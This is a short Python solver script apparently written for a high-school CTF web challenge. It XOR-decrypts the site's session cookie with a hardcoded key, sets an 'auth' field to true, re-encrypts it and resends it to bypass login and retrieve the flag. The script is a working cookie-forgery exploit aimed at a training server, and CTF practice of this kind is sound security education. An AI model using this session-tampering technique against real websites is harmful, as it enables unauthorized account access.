#!/bin/python3

import os
import requests
from pwn import *
import logging
from base64 import b64decode, b64encode
import math, json, re

logging.disable()

# Per le challenge web
URL = os.environ.get("URL", "http://baked.challs.cyberhighschools.it")
if URL.endswith("/"):
    URL = URL[:-1]

key = "SEGR3T0"
s = requests.session()
regex = re.compile("flag{[^}]*}")

res = s.get(URL)
if not res.ok:
    print(f"Cannot contact {URL}")
    exit(1)

try:
    session_cookie = s.cookies.pop("session")
except:
    print("Session cookie not found")
    exit(2)

decoded_cookie = b64decode(session_cookie)
secret = key * (math.ceil(len(decoded_cookie) / len(key)) + 1)
decrypted_cookie = "".join(chr(x ^ ord(y)) for (x, y) in zip(decoded_cookie, secret))
data = json.loads(decrypted_cookie)

data["auth"] = True
encrypted_cookie = "".join(
    chr(ord(x) ^ ord(y)) for (x, y) in zip(json.dumps(data), secret)
)
encoded_cookie = b64encode(encrypted_cookie.encode()).decode()
s.cookies.set("session", encoded_cookie)
res = s.get(URL)

flag = regex.findall(res.text)
if len(flag) == 0:
    print("Cannot find the flag")
    exit(4)
print(flag[0])
